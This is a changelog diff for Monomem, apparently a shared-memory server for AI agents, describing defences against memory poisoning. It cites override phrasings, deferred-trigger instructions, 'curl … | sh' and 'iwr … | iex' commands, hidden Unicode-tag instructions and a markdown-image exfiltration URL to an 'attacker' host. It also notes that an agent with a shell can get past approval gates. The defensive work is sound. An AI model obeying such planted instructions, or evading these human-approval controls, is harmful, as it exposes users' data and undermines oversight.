@@ -4,6 +4,395 @@ All notable changes to this project are documented here. The format is based on
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project aims
 to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+## [1.2.0] - 2026-11-05
+
+### Highlights
+
+- **Check your own setup.** `monomem drill` replays 20 known memory-poisoning attacks on a copy of your store.
+  `monomem health` turns that and your settings into one A to F grade and prints the rule. Two attacks are known misses.
+- **See where a note came from:** `monomem why`, `monomem receipts` and `monomem search --as-of`.
+- **Catch writers who disagree:** `monomem facts`, `monomem conflicts` and `monomem facts --check`.
+- **More control:** `approve-first --all`, `pin`, `rollback --writer`, the flood guard, the read access log, a
+  hash-chained audit log and `monomem token add`.
+- **Claude Code plugin.**
+- **Upgrade note:** the database moves to schema v18 on first start, after a verified backup. Older versions cannot
+  open it. See [docs/upgrading.md](./docs/upgrading.md).
+- **Limits:** the linter matches patterns, so reworded attacks get through; an agent with a shell can run the CLI itself.
+
+### Added
+
+- `monomem audit verify --expect <hash>` checks the audit log against a head hash you kept somewhere else.
+- INSTALL.md: how to connect a teammate's Claude Code, Cursor or Codex to a shared Monomem server.
+- Setup offers a dry-run import when it finds the official MCP memory server configured.
+
+- **`monomem approve-first --all on|off`** (admin `PUT /approve-first {all, on}`): every agent write in every
+  namespace, including ones created later, waits for approval. Turning it off needs a person at a terminal.
+- **`monomem facts --check [--namespace ns]`** exits 1 when any fact is disputed, for CI. `monomem facts` marks each
+  writer's current value and its older notes.
+
+- **`monomem facts [--namespace ns] [--json]`**: every fact key per namespace with its current value(s), who wrote them
+  and since when; disputed keys are marked, and agreement shows as "N writers agree". `monomem fact remove <id> <key>`
+  drops one fact from a note. A write whose title or body names a different value than one of its own facts gets a
+  `fact_warnings` entry (it is still stored).
+
+- **Time travel.** `monomem search "<query>" --as-of <ISO|7d|2h>` and the MCP `state_search` `as_of` show memory as it
+  stood at a past time, rebuilt from note history. A note whose text from then was pruned or purged says "text from
+  that time not kept" instead of showing newer text as old; hard-deleted notes cannot be rebuilt and the output says so.
+  Read-only. Ranking at a past time is a simple keyword match, not the full search.
+
+- **`monomem health [--json] [--card [file.svg]]`.** One line per check (setup, security settings, the poisoning drill,
+  the audit chain, writes waiting for review, distrusted writers, redacted notes, memory size) and a grade from A to F.
+  The rule is printed with it: each warning lowers the grade one step, any failure caps it at D, and an attack the drill
+  did not expect caps it at F. It also says what the grade does not cover (the linter matches patterns, so reworded
+  attacks and self-poisoning still get through). Exit code 1 for D to F.
+- **`monomem why <id>`** and the opt-in MCP tool `memory_why`: one note's history in time order (who wrote it, each
+  version, replacements, held edits, pin, the session starts it was shown at and why, current status). Titles only. It
+  ends with what is not recorded, such as who read the note (only a total and the last read time are kept).
+- **Conflicts between writers.** Agents can attach exact facts to a note (`facts: { "deploy_target": "render" }` on
+  `state_write` or `POST /notes`, stored as `fact:key=value` tags). When another writer's live note in the same namespace
+  has the same key with a different value, the write still succeeds and the reply lists the conflict, so the agent can
+  ask you. `monomem conflicts`, `monomem quality` and the dashboard list these first, then a "possible" tier from a text
+  rule (`key: value` lines in notes with the same title). It only flags; in the dashboard you choose Keep, Pin or
+  Distrust. Measured on 20 realistic contradicting pairs: the fact tier caught 20 of 20 when the facts were attached and
+  scoped per subject (`orders.database`, not `database`); without facts the text rule caught none of them. Notes from
+  distrusted writers are left out, and each side shows whether its writer name is stamped from a token or self-declared.
+- **Claude Code plugin.** `/plugin marketplace add calasdan-sketch/monomem`, then `/plugin install monomem@monomem`,
+  adds the MCP server, the start-of-session recall hook and the skill (see [docs/plugin.md](./docs/plugin.md)).
+  `server.json` and `mcpName` are ready for the MCP registry.
+
+- **`monomem drill`.** Replays 20 known memory-poisoning attacks on a temporary copy of your store, with your own
+  settings, and shows for each one whether it was held, stored with a warning, or reached the agent. Your store is not
+  changed. Two attacks are known misses and are listed as such: a reworded override the pattern linter cannot see
+  (scenario E16 in `monomem bench`), and self-poisoning (a trusted agent stores an attacker's instruction in its own words). Exit code 1 when
+  anything else gets through; `--json` for scripts. `evals/poisoning-corpus.json` (MIT) holds the attacks and expected
+  results so other memory tools can run the same set.
+- **Memory receipts.** `monomem receipts [session-id] [--json]` shows which notes each session start showed the agent
+  and why (the reason tags), with rank and approximate tokens. Only note ids and tags are stored, never titles or text,
+  and they are kept as long as the access log (`MONOMEM_ACCESS_LOG_DAYS`). Opt-in MCP tool `memory_receipt`.
+- **`monomem meter [--json] [--card [file]]`.** Prints the footprint, or writes a shareable SVG card (sessions, tokens
+  injected, tokens saved as an estimate at about 4 characters per token).
+- **`monomem token add | list | remove`.** Makes a strong random token for `tokens.json` and shows it once; `list` never
+  prints tokens. New guide: [docs/team.md](./docs/team.md) (shared memory for a team).
+- **`monomem search <query>`** does what `monomem relevant` does.
+- `GET /favicon.ico` serves the Monomem mark without a token.
+
+- **Tamper-evident audit log.** Each audit line carries `prev`, the sha256 of the line before it (carried across
+  rotation), and `monomem audit verify` counts every break and prints the head hash. Two apps writing at the same
+  moment are counted as a fork, not a break (an inserted line also looks like a fork, so forks are reported). It detects lines edited or removed inside the chain; it cannot detect the
+  newest lines being cut off, rotated files being deleted, or the whole file being rewritten by anyone who can write
+  it (an agent with a shell included). Lines written by older versions have no `prev` and are counted as unchained.
+- **Dashboard: a Held tab.** Reject is the main button, Approve the secondary one. Writes waiting for review are listed with their reasons ("instruction override",
+  "namespace requires approval" ...), writer and namespace, with Approve and Reject. Admin `GET /quarantine` lists them.
+- **Dashboard: who wrote it, on every card.** Each note shows its writer with a colour chip, and pinned notes are marked.
+- **MCP results say when.** `state_search`, `state_relevant` and `state_get` results carry a compact `when`: the date
+  the note was first written and how long ago (for example "2023-05-08, 5 months ago"; dates are UTC).
+
+- **Import from the official MCP memory server.** `monomem import --from mcp-memory [--path memory.jsonl] [--dry-run]` turns
+  each entity of `@modelcontextprotocol/server-memory`'s knowledge graph into a note (observations as a list, relations
+  underneath). Without `--path` it uses `MEMORY_FILE_PATH` or finds the file in the npx cache, where that server keeps it by
+  default and where it is easily lost. Same rules as the other imports: local only, dry run first, secrets skipped, every
+  note through the memory linter. See docs/switching.md.
+
+- **Approve-first namespaces.** `monomem approve-first <namespace> on|off` (no arguments lists them), or admin-only
+  `GET`/`PUT /approve-first` over REST. In such a namespace every write that is not from the local `monomem` CLI goes
+  into the existing quarantine queue with the reason "namespace requires approval", and is approved or rejected there
+  like a linter-held write; approval keeps the real writer. Held: creates, and updates that change the title, body or
+  source, add tags, or move a note into or out of the namespace. MCP (stdio and HTTP), every REST call (an admin token
+  included: REST cannot tell an operator from an agent holding one), the runner and the capture hooks are held. No MCP
+  tool changes the setting. Secrets are still refused outright. Forgetting, restoring and replacing notes there cannot
+  be queued, so they are refused for everyone but the CLI (state_delete, supersede preview/confirm/undo, setting a
+  `forget_after` date, REST archive, restore and hard delete return an error naming the namespace). An agent with a shell tool can run that CLI itself, so this protects against MCP and REST agents, not against agents that can run commands (see SECURITY.md). Details: [docs/memory-linter.md](./docs/memory-linter.md).
+- **Pinned notes (CLI-only).** `monomem pin <id>` / `monomem unpin <id>` (`monomem pin` lists them), or admin-only
+  `GET`/`PUT /pinned` over REST; no MCP tool pins. Agents still read a pinned note (reads show `pinned: true`), but only the
+  local `monomem` CLI can edit, forget, restore, hard-delete, replace (as the replaced note, and by supersede undo), restore an
+  older version of, purge the history of, or merge it. Every other caller gets an error naming the note: MCP, every REST call
+  (an admin token included, as for approve-first; an admin token can unpin and then change it), the server's own jobs. The
+  expiry sweep and decay never archive a pinned note. Not carried by export, import or sync. Details:
+  [docs/replacing-memories.md](./docs/replacing-memories.md#pinned-notes-cli-only).
+- **Roll back one writer.** `monomem rollback --writer <name> --since <ISO|30m|2h|7d> [--include-conflicts] [--yes]`, admin
+  `POST /rollback/preview` + `POST /rollback/confirm`, and the operator-only MCP tool `memory_rollback` (off over stdio unless
+  `MONOMEM_STDIO_ADMIN_TOOLS=1`). Notes the writer created since then are archived; notes whose title or body it changed get the
+  newest kept version from before its first change back, as a new version (so the history undoes it). Notes another writer
+  changed afterwards are skipped as conflicts unless `--include-conflicts`; a needed version that was pruned or purged is
+  reported as "cannot fully undo" and skipped. `stdio` covers every `stdio:<app>`. The preview writes nothing and returns a
+  one-time code (bound to the caller, expires); the confirm plans again, refuses if anything changed, and applies everything in
+  one transaction. Pinned notes and approve-first namespaces are rolled back from the CLI only. Tag/metadata edits, archives,
+  replacements and deletes the writer made are not rolled back. Details:
+  [docs/replacing-memories.md](./docs/replacing-memories.md#rolling-back-one-writer).
+- **Read access log.** Every memory read an agent makes (the MCP read tools, the REST read routes, the session-start and
+  per-file context the hooks inject) adds one row: time, the writer identity a write would be stamped with (token
+  label, or `stdio` / `cli` / `capture` ...), the tool or route, the namespaces, a query preview (secret-redacted, one
+  line, at most 120 characters, encrypted when at-rest encryption is on) and the result count. Never note text or
+  titles. View it with `monomem access [--since 24h|ISO] [--writer label] [--limit N] [--json]` or admin-only
+  `GET /access` (refused for a namespace-pinned token). No MCP tool reads it. Kept `MONOMEM_ACCESS_LOG_DAYS` (default
+  30; `0` = off). Details: [docs/access-log.md](./docs/access-log.md).
+- **Flood guard.** A writer label that makes `MONOMEM_FLOOD_WRITES_PER_HOUR` (default 500; `0` = off) creates/updates in
+  a rolling hour is paused: its next write and every later create, update, forget or restore is refused (HTTP 429 over
+  REST) until `monomem resume <label>` or admin `POST /flood/resume`. A pause writes an audit entry and a stderr
+  warning, survives a restart, and shows in `monomem flood`, `monomem access` and `GET /flood`. Counted: every
+  create/update call that reaches the guard (stored, held or refused). Never counted or paused: the `monomem` CLI, the
+  server's own jobs, quarantine approval, consolidation, backup restores. A labelled stdio app (`stdio:<app>`) has its
+  own count; unlabelled ones share `stdio`. The label is self-declared, so the guard stops runaway loops, not a
+  hostile app.
+- **`state_search` `mode: "relevant"`** does what `state_relevant` does: `query` is read as a conversational message,
+  its keywords are extracted, and notes matching any of them come back with the keywords (default limit 5).
+- **Two warn-only linter categories.** `pii`: email addresses, phone numbers, IPv4/IPv6 and
+  private (RFC 1918) addresses, and `.local` / `.internal` / `.corp` / `.lan` host names.
+  `directive`: deferred triggers for a later agent ("next time the user asks …, run …", "from now
+  on always …", "in future sessions …"), `curl … | sh` and `iwr … | iex`, and install-a-package
+  commands (npm/pnpm/yarn/bun, pip, cargo, go). Both store the note and return a warning by
+  default. `MONOMEM_LINT=pii=quarantine` or `directive=quarantine` holds such writes instead; they
+  never block. Reserved and documentation names (`example.com`, `192.0.2.x`, `2001:db8::`),
+  loopback and `v1.2.3.4`-style versions are not flagged. These are regex warnings: they miss
+  names, addresses and reworded directives, and they flag some harmless notes (a bare `1.2.3.4`,
+  "from now on use pnpm"). → [docs/memory-linter.md](./docs/memory-linter.md)
+- **Each local app's writes say which app it was.** `monomem setup` now puts `MONOMEM_CLIENT=<app>`
+  in each app's MCP entry (`claude-code`, `claude-desktop`, `cursor`, `codex`, `gemini`, `muse`,
+  `vscode`, `zed`; a folder's `.mcp.json` gets `claude-code`), and the stdio server stamps
+  `written_by` as `stdio:<app>` instead of plain `stdio`. Re-running setup adds the name to an
+  existing entry once (Codex: only when `[mcp_servers.monomem]` is its own table without an `env`
+  yet; otherwise setup says how to add it by hand). HTTP entries are left alone. An install that
+  never re-runs setup keeps stamping `stdio`.
+  The name is **self-declared** by the config file (anything that can edit it, or launch
+  `monomem mcp` itself, can claim any name). It tells apps apart; it is not authentication and
+  grants nothing: stdio access is unchanged. Scoped tokens over HTTP remain the authenticated option.
+  A name must be 1-40 characters `a-z 0-9 . _ -` (lower-cased); anything else is ignored with a
+  warning on stderr and writes stay `stdio`.
+- The client's own `clientInfo` name and version from the MCP handshake are written to the audit
+  log (`mcp.connect`) as a **claim** only; they are never used for `written_by` or any decision.
+
+### Changed
+
+- `drill` and `health` say plainly that the drill covers the published known attacks only, which the linter was tuned on.
+- Setup and health no longer assume Claude Code; health does not count a declined or absent Claude hook against you.
+- Dashboard: labelled buttons for screen readers, a heading per view, a red count for fact disputes, "held" wording
+  throughout. The health and meter cards carry the Monomem mark and how to install it. The demo is recorded in the
+  dark theme. SECURITY.md has a contact address, a disclosure window and a "Your data" section.
+
+- `monomem facts` puts synonym keys on one row under the common key ("also written as db") and counts agreement
+  across spellings. The key hint always steers toward the common key, never away from it.
+- Clearer wording: `approve-first` lists the store-wide switch first; the Held card no longer repeats itself and shows
+  the held note's facts and tags; the start-of-session footer says how many tokens are the notes themselves; `why`
+  cuts long titles at a word. Times in `why` and `receipts` are local with the UTC offset (JSON stays in UTC).
+- README: approve-first protects against tools that only have the memory connection; an agent that can run shell
+  commands can run `monomem` itself (see SECURITY.md).
+
+- Disputes are grouped per namespace (the same key in two projects is not a dispute); an unscoped session start names
+  the namespace. Synonym keys (`hosting`, `runs_on` for `deploy_target`) count as one setting in `conflicts`, `facts`,
+  the session start and the dashboard. `similar_keys` also catches plurals and one-letter slips.
+- The session start explains each writer's label once instead of on every line, and the `state_write` text shows a
+  `facts` example. The body/fact warning says the text "may" name another value.
+- README: a shorter first screen and a table of the check-and-explain commands with what each cannot catch.
+- The `--as-of` header says in plain words how far archive history reaches and skips a zero count.
+
+- **Dispute lines work in a default install** (no namespace setup needed). Each is a notice from Monomem with the
+  quoted values, note numbers and writers, one value per writer, at most two lines plus "+N more"; notes marked
+  never-show and distrusted writers are left out. A writer who changed their mind is not shown as disagreeing with
+  themselves.
+- `similar_keys` gives the existing value, note and writer plus a one-line hint, no longer flags a subject-prefixed
+  key against its own base key, and a value set under a synonym key (`hosting` vs `deploy_target`) is reported as a
+  conflict. REST `PUT /notes/:id` accepts `facts` and returns the same conflict information as `POST`.
+- Dashboard Keep reports a change that was held for review as held, marks the other note `fact-removed:<key>` and
+  says its text may still name the old value; Pin and Distrust sit under "More".
+- `--as-of` no longer shows today's writer id, attestation or confidence next to old text; times include seconds; the
+  header counts notes that were archived or replaced then.
+- `monomem drill` and `health` run with embeddings off and make no network call, even when a remote
+  `MONOMEM_EMBED_URL` is set. An unrecognised `MONOMEM_LINT` value gets a "did you mean" hint and names the default
+  used. A failing embeddings backend is reported once per process, not once per note.
+- REST `PUT /notes/:id` accepts and ignores the server's own read-only fields, so reading a note and sending it back
+  works; unknown fields are still refused.
+
+- **Facts are easier to get right.** `state_write` tells agents to attach `facts` when they record a decision, and to
+  use a common key when one fits (deploy_target, package_manager, test_runner, database, node_version, base_url,
+  ci_provider, formatter). A key that is new to the namespace gets `similar_keys` hints over MCP, so two agents settle
+  on one name. SKILL.md and the docs give the same advice.
+- **Disputes show up where agents act.** When writers disagree on a fact in the namespace being recalled, the start of
+  a session adds up to two "Disputed: ... Ask the user before acting." lines (nothing when there is no dispute).
+- **Conflicts are grouped one block per key** in the CLI, `monomem quality` and the dashboard; a capped list says
+  "showing N of at least M". In the dashboard, Keep on a fact dispute removes only that fact from the other notes
+  (through the normal edit path, so the linter, approve-first and pins still apply); replacing a whole note is a
+  separate choice. The confirmation is a few plain lines inside the card you clicked.
+- **Time travel shows who wrote the old text** (from note history), or "writer then: not recorded", never today's
+  writer. Archive, restore and supersede undo are now part of the picture from a new `archive_log` (no schema change),
+  which covers the time since this version first opened the database; the header says from when.
+- `--as-of` output adds a text snippet, an "edited since" marker, local time with the UTC offset, and `--json`.
+- `health` and `doctor` also warn on a remote `MONOMEM_EMBED_URL` with embeddings on (note text leaves the machine),
+  custom `MONOMEM_ALLOWED_ORIGINS`, `MONOMEM_NO_CHMOD=1`, proxy trust beyond loopback,
+  `MONOMEM_RUNNER_ACCEPT_LEGACY`, and a `MONOMEM_LINT` value they do not recognise.
+- REST `POST` and `PUT /notes` reject unknown fields with a 400 naming them (a misspelt `content` used to save an
+  empty note). The short help lists `why`, `receipts` and `conflicts`.
+
+- **`monomem health` grades fairly.** Writes held for review, distrusted writers and redacted notes are shown as info
+  and never lower the grade; a new store grades A. Each weakening setting is its own line (the linter off and agent
+  admin tools over stdio are failures). A missing audit log, or one that shrank or changed since the last run, warns.
+  A Claude Code plugin install of the hook is detected. The card gives the reason for the grade. `doctor` and `health`
+  share one security check. `--card` without a path writes into the data folder.
+- **`monomem why`** uses the same writer wording as the rest of Monomem, hides earlier versions by a distrusted writer,
+  and its JSON includes the receipt retention.
+- **Claude Code plugin:** the start-of-session hook is `hook session-start` (so receipts and the meter work) with a 20 s
+  timeout, and `npm version` keeps the plugin files and `server.json` on the same version.
+- The start-of-session footer no longer reads as if memory cost more than it saved.
+- README: a "Check and explain your memory" section (drill, health, why, conflicts, receipts, time travel, plugin).
+
+- `monomem drill` says "blocked" for defences other than quarantine and keeps "held" for quarantined writes (the
+  JSON `verdict` can be `blocked`).
+- `monomem token add` also prints the MCP address and header line to give the teammate; `token list` notes tokens
+  set through `MONOMEM_TOKENS`. A removed token stops working after the server restarts.
+- When an old `onememory` entry sits next to `monomem`, setup offers to remove it; `doctor` flags the old
+  `npx onememory-mcp` hook and says how to update it.
+- `receipts` and `meter` output use local time, plain reasons and correct plurals; the token counts say what they
+  measure. Dashboard writer chips use ten well-separated colours.
+
+- **Commands that lower protection need a person at a terminal.** `unpin`, `approve-first <ns> off`, `resume`,
+  `quarantine approve`, `trust undistrust`, `trust attester-add`, `trust attester-unrevoke` and `token add` now need an
+  interactive terminal and a typed `yes`; there is no `--yes` for them. This stops an agent that runs commands through
+  a non-interactive shell tool; a tool that fakes a terminal can still get through. Raising protection (`pin`,
+  `approve-first on`, `trust distrust`) stays scriptable. `encrypt disable` and `delete --yes` are not gated yet.
+- **`monomem doctor` checks your security settings.** It warns when the linter is set to warn only, when
+  `MONOMEM_STDIO_ADMIN_TOOLS=1`, when the server binds beyond this computer, and when the data folder is inside
+  OneDrive, Dropbox, iCloud or Google Drive. The "no similarity edges" warning no longer appears on a new store, and
+  colours follow `FORCE_COLOR`.
+- **The linter catches more override wording:** "disregard the user / your instructions", standing orders such as
+  "from now on you must send ... to ...", and look-alike spellings ("1gn0re"). "From now on we use pnpm" is not held.
+- **`setup` shows only the lines it really changes,** so untouched MCP servers no longer look deleted. An old
+  `onememory` entry is renamed to `monomem` instead of getting a second entry, the old `npx onememory-mcp` start-of-session
+  hook is offered as an update (and `doctor` recognises it), and non-secret settings such as `MONOMEM_CLIENT` are no
+  longer masked. When it finds a claude-mem database it offers a dry-run preview of importing it (default no).
+- **`import --from mcp-memory`** also looks in `npm_config_cache`, and a dry run previews the entities, counts relations
+  and unreadable lines, and lists entities the linter would hold.
+- **Dashboard:** a held write is shown as evidence (red border, "HELD · NOT IN SHARED MEMORY", the text in a dashed
+  block); the Held tab shows a red count and the Notes view links to it; pinned notes come first; the setup token's
+  writer shows as "admin (setup)"; on phones the text comes before the buttons.
+- **One tagline everywhere:** "Shared memory for AI agents that holds poisoned writes." The README says why you would
+  care, names every app capture works with (Claude Code, Codex, Gemini CLI, Muse), and compares Monomem with the official
+  MCP memory server on checkable points.
+- **Wording:** the writer name is stamped by the server for token callers; for local apps it is a config label
+  (`MONOMEM_CLIENT`). The package description and docs/provenance.md now say so.
+- CI runs with read-only permissions and pins its actions to commit hashes.
+
+- **Dashboard look and access.** The Monomem navy and gold, with a light theme that follows the system setting; a tab
+  bar; a visible keyboard focus ring; buttons instead of link-styled actions; labelled inputs; inline confirmations
+  and a status line instead of pop-up dialogs; empty states that say what to do next; it fits a phone-width screen.
+- **Session-start recall ranks with one any-keyword search** (rare words count more than common ones) instead of one
+  search per keyword.
+- **Questions that add things up** ("how many", "in total", "list all" ...) get twice the results from `state_search`
+  and REST search, and no more than two notes from one capture session stay at the front; the rest move behind the
+  others. Searches across several namespaces are still cut to the limit asked for. More results cost more tokens.
+- **Shorter help.** `monomem help` shows the common commands in four groups; `monomem help --all` shows everything. An
+  unknown command suggests the closest one and exits with an error instead of printing all of help.
+- `monomem doctor` colours `[ok]` and `[warn]` on a terminal (not when `NO_COLOR` is set or output is piped).
+- On a Node version that is too old, the error now shows a one-line `npx` workaround for running setup.
+- README: a new first screen (what it is, the install line, four reasons), with the detail below it. Earlier versions
+  are kept up to 20 per note by default, and the README now says so. The brand images no longer say notes are
+  "undoable" (deleting is permanent); they say "reviewable".
+- SECURITY.md: a section on the write controls and their limits; SQL, token-file (POSIX only) and linter wording corrected.
+
+- **Better search ranking when a question only partly matches.** `state_search` (after its all-words step) and
+  `state_relevant` now rank notes with one BM25 query over the question's keywords, so rare words count more than
+  common ones, scaled by how many of the keywords each note contains. Before, each keyword was searched separately and
+  every keyword counted the same. Measured back to back on the same PC: LongMemEval-S recall@5 95.1 % to 96.8 %,
+  LoCoMo-10 by turn 45.3 % to 57.4 %, LoCoMo-10 by session 89.2 % to 89.5 %; one number dropped (LoCoMo session
+  recall@10, 94.9 % to 94.8 %, one question). Full table: [docs/BENCHMARK.md](./docs/BENCHMARK.md#retrieval-longmemeval-s-and-locomo).
+- **Hybrid search ranks better.** Hybrid mode (embeddings on) now blends the keyword and semantic scores 50/50 instead of
+  combining only their rank order (RRF), so it no longer drags a clear keyword match down. Old hybrid was worse than
+  keywords alone on LoCoMo whole sessions (recall@5 80 % vs 89 %); new hybrid is better than keywords on every dataset
+  measured: LoCoMo by session 91.3 %, by turn 65.7 %, LongMemEval-S 98.1 % recall@5 (see docs/BENCHMARK.md).
+- **Dates in a search help.** "What did we do in June?" or "last week" now ranks notes written in that window (or up to a
+  week after) higher, without hiding the others. An explicit time range still filters strictly.
+- **Faster keyword search.** The search index gains a 1-character prefix index (about 8 % more index space), so
+  short query words no longer scan every word that starts with the same letter. An existing database is re-indexed
+  once when it is first opened (this can take a moment on a large one); older versions still open it. Measured back to
+  back: keyword search p50 2.7 to 2.4 ms on LongMemEval-S, 1.8 to 1.2 ms on LoCoMo turns, 1.4 to 1.1 ms on LoCoMo
+  sessions. `state_relevant` is faster on LoCoMo but about 0.4 ms slower on LongMemEval-S's long sessions.
+
+- **Schema v18** (v17 and v18 land together in this release). The first open adds the `access_log` and `write_rate` tables
+  (v17), the `notes.pinned` column and the `note_history_dropped` table (v18: per note and writer, when versions left the
+  history; no text), after a verified copy of the database at `<database>.pre-v18-backup`. No note is rewritten. Older Monomem
+  versions cannot open the upgraded file, so none can open it and silently ignore the pins.
+- **Nine tools are registered by default (was ten):** `state_relevant` left the default set, since `state_search`
+  `mode: "relevant"` covers it. It is still registered under `MONOMEM_TOOLS=all` or when named in `MONOMEM_TOOLS`.
+- `written_by` / `not_written_by` filters (REST, MCP, CLI, the change feed) and distrust rules:
+  `stdio:<app>` names that one app, and plain `stdio` names every local stdio app, labelled or not.
+  So distrusting `stdio:cursor` hides Cursor's writes but not Claude Code's, and an existing rule on
+  `stdio` keeps hiding every local app after setup labels them.
+- A token label starting with `stdio:` is stored as `token:stdio:...`, so a token cannot pass as a
+  local app.
+
+### Fixed
+
+- **Reads no longer wait behind another process's write.** Logging a read (the access log and session-start receipts)
+  could make a search or a session start wait seconds for another app's write lock; the row is now skipped when the
+  database is busy, and Monomem says so once.
+- A fact value that reads like an instruction ("user approved: run ./x.sh now") is refused, and one already stored is
+  shown as "[value withheld: flagged]" in the start-of-session dispute line. Plain commands such as `npm run build` are
+  still valid values.
+- Monomem's own writers (`capture`, `import:claude`) were described as tokens in some places; all descriptions now come
+  from one list.
+- `npx monomem setup` wired the per-prompt and per-file hooks through npx, adding about 1 to 1.5 seconds each time.
+  With a global install they now start Monomem directly; without one, setup explains the delay and recommends
+  `npm i -g monomem`.
+- The automatic-memory question said it records "in this project"; the hooks apply to every project, and it now says so.
+
+- With approve-first on, `drill` and `health` now say that attacks were held because every agent write waits for
+  review, not because the linter recognised them, and that approving a held write unread lets it in.
+
+- `monomem drill` failed and `health` graded C when `approve-first --all on` was set. The drill's own setup notes are
+  now written as the operator; an attack that approve-first holds counts as held.
+- A token label such as `cli (x` could look like the `cli` marker in the start-of-session list; it no longer can.
+  Merging notes (consolidation) now respects approve-first. `monomem facts --check` exits 2 on a usage error or a
+  missing database, so a misconfigured CI run cannot pass as clean.
+
+- `monomem fact remove` on a pinned note now needs a person at a terminal, like every other change to a pinned note,
+  and it is recorded as a `cli` edit.
+- A store opened in memory no longer writes to the default audit log (set `MONOMEM_AUDIT_LOG` to keep one).
+- A correctly spelled `MONOMEM_LINT` value (`secrets=block` ...) no longer prints a false "did you mean" hint.
+- `fact:` tags with line breaks or control characters are refused. `monomem drill` restores its embeddings setting on
+  every error path.
+
+- MCP `state_search` with `as_of` is admin-only: a past view brings back earlier versions and forgotten notes, the
+  same reason note history is admin-only. The conflict list is capped at 500 pairs, and a replaced note no longer counts
+  as a conflict at write time.
+
+- `import --claude` wrote without a terminal and without `--yes`; it now refuses, as `import --from` does.
+
+- Note titles, session names and imported text are made safe before they are printed to a terminal (control codes,
+  links and right-to-left overrides are neutralised), so a planted note cannot rewrite the terminal title or clear it.
+- Changing a **pinned** note from the command line (archive, restore, delete, replace, merge, restore or purge its
+  history) now needs a person at a terminal, like `unpin`. SECURITY.md lists exactly what is and is not gated.
+- The new linter rules no longer hold ordinary notes such as "we ignore user requests older than 5 minutes" or "from
+  now on you will email the weekly report"; standing orders are held when they name secrets, keys or an outside URL.
+- `monomem drill` works on an encrypted store, creates nothing beside your real store, and cleans up its temporary
+  copy on Ctrl-C.
+- `setup` masks secrets passed in command arguments (`--token`, `--api-key` ...) and in URL query strings.
+- `import --from` refuses to write without a terminal unless `--yes` is given. `FORCE_COLOR=0` turns colour off.
+- The tests can no longer write to your real data folder when a single test file is run on its own.
+
+- `monomem audit verify` answered "Unknown command".
+
+- **Instructions hidden in invisible Unicode tag characters (U+E0000-E007F) were never scanned.** The memory linter
+  removed them before scanning, but they were stored and shown to the model as written. They are now decoded and
+  scanned, and any tag character, or a run of four or more variation selectors, is flagged as "hidden Unicode tag
+  text" (only the England, Scotland and Wales flag emoji are exempt). Tag characters are removed from `source` when
+  it is stored. Covered by `monomem bench` scenario E19.
+- **Every forget, restore and expiry is now in the audit log.** Archive and restore over REST and the CLI, and the
+  expiry and decay sweeps, wrote no audit line. They now do, from the store itself, whatever the caller.
+
+- `memory_index` (and `GET /index`) with a whole question ("why did the login test fail?") returned nothing: it needed every
+  word in one row. It now uses the same keyword search as `state_search`, and a captured observation written just before or
+  after another hit in the same session ranks higher. Measured with LoCoMo-10 turns stored as captured observations, on
+  conversations not used to choose the weight: recall@5 0.2 % before, 61.7 % now.
+- `state_search` with only one meaningful word in a question ("where is the deploy?") returned nothing, because the
+  all-words search also needed "where" and "is". It now falls back to that one word.
+
+### Benchmark
+
+- **128 deterministic scenarios** (was 125): A 32, B 31, C 27, D 19, E 19.
+  - **E17:** a sleeper instruction for a later session is stored with a "deferred trigger" warning.
+  - **E18:** a `curl … | sh` note is stored with a "pipe to shell" warning.
+- The bench adapter now passes a write's linter warnings through to the checks.
+
 ## [1.1.1] - 2026-11-03
 
 ### Security
@@ -288,7 +677,7 @@ updates; it will not be unpublished, so nothing you have installed breaks.
   measuring the developer's laptop rather than the code, the same failure that shipped the wrong Node
   floor three times in 2.1.x.
 
-## [2.1.2] - 2026-11-01
+## [OneMemory 2.1.2] - 2026-11-01
 
 **2.1.1 published the wrong Node floor and would crash for part of the line it claimed to support.**
 
@@ -365,7 +754,7 @@ Each of these was published and wrong:
 - Owner identity removed from tracked source: a real name in a test path, a personal username across
   nine lines, and a comment that compiled into the published tarball.
 
-## [2.1.1] - 2026-11-01
+## [OneMemory 2.1.1] - 2026-11-01
 
 `v2.1.0` was tagged but never published: its release run failed on Windows when a test deleted its own
 temp directory while a detached child still held the database open — after every assertion had passed.
@@ -439,11 +828,11 @@ command queueing and runner status — when the command runner is not even shipp
   the loop open; nothing else did. The bounded timeout is now held, so a wait always settles, and shutdown still ends
   waiters at once through `abortAllWaiters()`.
 
-## [2.0.1] - 2026-10-31
+## [OneMemory 2.0.1] - 2026-10-31
 
 Release-only: published to the staging registry only, never to the public npm registry. Same code as 2.0.0; releases are now staged on npm and approved by the owner.
 
-## [2.0.0] - 2026-10-31
+## [OneMemory 2.0.0] - 2026-10-31
 
 OneMemory now remembers on its own: it records what your agent does, distills it into short typed notes, and brings the
 right ones back at the start of the next session — with no model call unless you turn one on, nothing leaving your
@@ -544,7 +933,7 @@ run `onememory setup --capture` and say yes.
 - **Markdown image exfiltration is held** (`GAP-POISON-MDLINK`): a note with a remote markdown image carrying a query
   string (`![x](https://attacker/p?data=...)`), which loads by itself when rendered, goes to quarantine. Badge hosts are exempt.
 
-## [1.7.2] - 2026-10-25
+## [OneMemory 1.7.2] - 2026-10-25
 
 Windows fixes only. **No schema change** (still v15).
 
@@ -555,7 +944,7 @@ Windows fixes only. **No schema change** (still v15).
   Links and `..` that leave the repository are still refused (tests added).
 - The macOS path test in `setup.test` now accepts Windows separators.
 
-## [1.7.1] - 2026-10-25
+## [OneMemory 1.7.1] - 2026-10-25
 
 Fixes from an independent review of 1.7.0. **No schema change** (still v15).
 
@@ -587,7 +976,7 @@ Fixes from an independent review of 1.7.0. **No schema change** (still v15).
 - Setup's backups and `setup-history.json` can hold the same secrets as your config: `0600` on macOS/Linux, and on Windows they use your profile's
   normal permissions (docs/live-claude-code.md, section 6).
 
-## [1.7.0] - 2026-10-25
+## [OneMemory 1.7.0] - 2026-10-25
 
 Easy, safe connection to Claude Code and an easy way in for what Claude Code already knows. **No schema change** (still v15).
 
@@ -619,7 +1008,7 @@ Easy, safe connection to Claude Code and an easy way in for what Claude Code alr
 ### Changed
 - `doctor` recognises hooks written by `setup` (which call `node <cli.js> recall`) as well as `onememory recall`.
 
-## [1.6.0] - 2026-10-25
+## [OneMemory 1.6.0] - 2026-10-25
 
 Closes every gap the 1.5.0 benchmark recorded, without ever changing a memory silently. **Schema v15** (a verified
